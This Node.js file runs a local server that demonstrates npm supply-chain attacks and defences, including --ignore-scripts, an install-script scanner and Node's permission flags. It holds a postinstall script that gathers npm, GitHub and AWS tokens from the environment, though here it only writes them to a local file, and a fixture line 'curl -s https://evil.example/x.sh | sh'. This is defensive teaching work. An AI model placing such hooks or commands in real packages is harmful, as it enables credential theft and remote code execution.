import http from 'node:http';
import { execFile } from 'node:child_process';
import { existsSync } from 'node:fs';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { findInstallScripts } from '../scripts/find-install-scripts.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.resolve(here, '..');
const scanner = path.join(repo, 'scripts/find-install-scripts.js');
const permissionApp = path.join(repo, 'permission-demo/app.mjs');
const MAX_BODY = 64 * 1024;
const NPM = process.platform === 'win32' ? 'npm.cmd' : 'npm';

// Fake values only. The npm child process never sees your real environment.
const FAKE_TOKENS = {
  NPM_TOKEN: 'npm_FAKE_demo_token_123',
  GITHUB_TOKEN: 'ghp_FAKE_demo_token_456',
  AWS_SECRET_ACCESS_KEY: 'FAKE/demo/aws/secret/789',
};

const POSTINSTALL_SCRIPT = `// Runs automatically during \`npm install\`.
const fs = require('fs');
const path = require('path');
const loot = {};
for (const name of ${JSON.stringify(Object.keys(FAKE_TOKENS))}) {
  if (process.env[name]) loot[name] = process.env[name];
}
// A real attack sends this to the attacker's server.
// The demo writes it to a file instead, so nothing leaves your machine.
fs.writeFileSync(path.join(process.env.INIT_CWD, 'exfiltrated.json'), JSON.stringify(loot, null, 2));
`;

function run(cmd, args, options = {}) {
  return new Promise((resolve) => {
    execFile(cmd, args, { timeout: 60_000, ...options }, (err, stdout, stderr) => {
      resolve({ code: err ? (typeof err.code === 'number' ? err.code : 1) : 0, output: `${stdout}${stderr}`.trim() });
    });
  });
}

// Every npm call is offline, with a throwaway cache, HOME, and config, so neither
// this repo's .npmrc nor your ~/.npmrc applies and no real tokens are in reach.
function npm(tmp, args, cwd, extraEnv = {}) {
  const flags = ['--offline', '--no-audit', '--no-fund', '--loglevel=error',
    `--userconfig=${path.join(tmp, 'user.npmrc')}`, `--globalconfig=${path.join(tmp, 'global.npmrc')}`];
  const env = { PATH: process.env.PATH, HOME: tmp, npm_config_cache: path.join(tmp, 'cache'), ...extraEnv };
  return run(NPM, [...args, ...flags], { cwd, env }).then((r) => ({ ...r, command: `npm ${args.join(' ')}` }));
}

const shorten = (text, tmp) => text.replaceAll(tmp, '$TMP');

async function withTmp(fn) {
  const tmp = await mkdtemp(path.join(tmpdir(), 'supply-chain-demo-'));
  await writeFile(path.join(tmp, 'user.npmrc'), '');
  await writeFile(path.join(tmp, 'global.npmrc'), '');
  try {
    return await fn(tmp);
  } finally {
    await rm(tmp, { recursive: true, force: true });
  }
}

async function postinstall({ tokens = ['NPM_TOKEN', 'GITHUB_TOKEN'] } = {}) {
  const env = Object.fromEntries(Object.entries(FAKE_TOKENS).filter(([k]) => tokens.includes(k)));
  return withTmp(async (tmp) => {
    const pkg = path.join(tmp, 'totally-legit-utils');
    await mkdir(pkg);
    await writeFile(path.join(pkg, 'package.json'), JSON.stringify({
      name: 'totally-legit-utils', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node postinstall.js' },
    }, null, 2));
    await writeFile(path.join(pkg, 'index.js'), 'module.exports = (s) => s.trim();\n');
    await writeFile(path.join(pkg, 'postinstall.js'), POSTINSTALL_SCRIPT);
    const packed = await npm(tmp, ['pack', '--pack-destination', tmp, pkg], tmp);
    if (packed.code !== 0) throw new Error(`npm pack failed: ${packed.output}`);
    const tarball = path.join(tmp, 'totally-legit-utils-1.0.0.tgz');

    const install = async (side, extraArgs) => {
      const app = path.join(tmp, side);
      await mkdir(app);
      await writeFile(path.join(app, 'package.json'), JSON.stringify({ name: `${side}-app`, version: '1.0.0', private: true }));
      const result = await npm(tmp, ['install', ...extraArgs, tarball], app, env);
      const loot = path.join(app, 'exfiltrated.json');
      const exfiltrated = existsSync(loot) ? JSON.parse(await readFile(loot, 'utf8')) : null;
      const envLine = Object.keys(env).map((k) => `${k}=${env[k]}`).join(' ');
      return {
        command: shorten(`${envLine} ${result.command}`.trim(), tmp),
        output: shorten(result.output, tmp) || '(no output)',
        exitCode: result.code,
        exfiltrated,
        exploited: exfiltrated !== null,
      };
    };
    const [unsafe, safe] = await Promise.all([install('unsafe', []), install('safe', ['--ignore-scripts'])]);
    return { script: POSTINSTALL_SCRIPT, unsafe, safe };
  });
}

async function scan({ allow = '' } = {}) {
  const allowList = String(allow).split(',').map((s) => s.trim()).filter(Boolean);
  return withTmp(async (tmp) => {
    const nm = path.join(tmp, 'node_modules');
    const pkgs = [
      ['clean', { name: 'clean', version: '1.0.0', scripts: { test: 'node test.js' } }],
      ['evil', { name: 'evil', version: '6.6.6', scripts: { postinstall: 'curl -s https://evil.example/x.sh | sh' } }],
      ['@scope/native', { name: '@scope/native', version: '2.0.0' }, true],
      ['clean/node_modules/deep', { name: 'deep', version: '0.1.0', scripts: { preinstall: 'node collect-env.js' } }],
    ];
    for (const [dir, manifest, native] of pkgs) {
      await mkdir(path.join(nm, dir), { recursive: true });
      await writeFile(path.join(nm, dir, 'package.json'), JSON.stringify(manifest));
      if (native) await writeFile(path.join(nm, dir, 'binding.gyp'), '{}');
    }

    const found = findInstallScripts(tmp);
    const lines = found.flatMap((f) => [
      `${f.name}@${f.version}`,
      ...(Object.keys(f.scripts).length
        ? Object.entries(f.scripts).map(([hook, cmd]) => `  ${hook}: ${cmd}`)
        : ['  install: node-gyp rebuild (implicit, from binding.gyp)']),
    ]);

    const args = [scanner, tmp, ...(allowList.length ? ['--allow', allowList.join(',')] : [])];
    const result = await run(process.execPath, args);
    return {
      unsafe: {
        command: 'npm install   # no review step',
        output: `npm would run all of these, unreviewed:\n\n${lines.join('\n')}`,
        exploited: true,
        label: 'Runs unreviewed',
      },
      safe: {
        command: shorten(`node scripts/find-install-scripts.js ${args.slice(1).join(' ')}`, tmp),
        output: shorten(result.output, tmp),
        exitCode: result.code,
        exploited: false,
        label: result.code === 0 ? 'All allowlisted' : 'Flagged for review',
      },
    };
  });
}

// app.mjs prints "action: result" lines. Node's own warnings (e.g. for
// --allow-child-process) start with "(node:<pid>)" and are kept separately.
function parseAttempts(output) {
  const lines = output.split('\n').filter(Boolean);
  const warnings = lines.filter((l) => /^\(node:\d+\) /.test(l)).map((l) => l.replace(/^\(node:\d+\) /, ''));
  const attempts = lines.filter((l) => !l.startsWith('(')).map((line) => {
    const [, action, result] = line.match(/^(.*): (.*)$/) ?? [null, line, ''];
    return { action, result };
  });
  return { attempts, warnings };
}

async function permission({ grants = [] } = {}) {
  const extra = [];
  if (grants.includes('child-process')) extra.push('--allow-child-process');
  if (grants.includes('fs-write')) extra.push(`--allow-fs-write=${tmpdir()}`);
  const safeArgs = ['--permission', `--allow-fs-read=${path.join(repo, 'permission-demo')}`, ...extra];

  const side = async (flags) => {
    const result = await run(process.execPath, [...flags, permissionApp]);
    const { attempts, warnings } = parseAttempts(result.output);
    const readParent = attempts.find((a) => a.action === 'read ../package.json');
    return {
      command: ['node', ...flags, 'permission-demo/app.mjs'].join(' ').replaceAll(repo + path.sep, './').replaceAll(tmpdir(), '$TMPDIR'),
      attempts,
      warnings,
      exploited: readParent?.result === 'allowed',
    };
  };
  const [unsafe, safe] = await Promise.all([side([]), side(safeArgs)]);
  return { unsafe, safe };
}

const ROUTES = { postinstall, scan, permission };

async function readJson(req) {
  const chunks = [];
  let size = 0;
  for await (const chunk of req) {
    size += chunk.length;
    if (size > MAX_BODY) throw Object.assign(new Error('body too large'), { status: 413 });
    chunks.push(chunk);
  }
  if (!size) return {};
  try {
    return JSON.parse(Buffer.concat(chunks).toString('utf8'));
  } catch {
    throw Object.assign(new Error('invalid JSON'), { status: 400 });
  }
}

function send(res, status, body, type = 'application/json; charset=utf-8') {
  res.writeHead(status, { 'Content-Type': type, 'Cache-Control': 'no-store', 'X-Content-Type-Options': 'nosniff' });
  res.end(type.startsWith('application/json') ? JSON.stringify(body) : body);
}

export function createDemoServer() {
  const server = http.createServer(async (req, res) => {
    // Local-only guards: this server runs real attacks, so no other website may drive it.
    const port = server.address()?.port;
    const allowedHosts = [`127.0.0.1:${port}`, `localhost:${port}`];
    if (!allowedHosts.includes(req.headers.host)) return send(res, 403, { error: 'forbidden host' });
    const origin = req.headers.origin;
    if (origin && !allowedHosts.map((h) => `http://${h}`).includes(origin)) return send(res, 403, { error: 'forbidden origin' });

    try {
      const { pathname } = new URL(req.url, 'http://localhost');
      if (req.method === 'GET' && pathname === '/') {
        return send(res, 200, await readFile(path.join(here, 'index.html'), 'utf8'), 'text/html; charset=utf-8');
      }
      const route = pathname.startsWith('/api/') && Object.hasOwn(ROUTES, pathname.slice(5)) ? ROUTES[pathname.slice(5)] : null;
      if (req.method === 'POST' && route) {
        if (!req.headers['content-type']?.startsWith('application/json')) return send(res, 415, { error: 'expected application/json' });
        return send(res, 200, await route(await readJson(req)));
      }
      send(res, 404, { error: 'not found' });
    } catch (err) {
      send(res, err.status ?? 500, { error: err.message });
    }
  });
  return server;
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const port = Number(process.env.PORT ?? 4103);
  createDemoServer().listen(port, '127.0.0.1', () => {
    console.log(`Supply-chain demo: http://127.0.0.1:${port}`);
    console.log('Warning: this runs deliberately vulnerable code (fake tokens, temp dirs only). It only listens on 127.0.0.1.');
  });
}
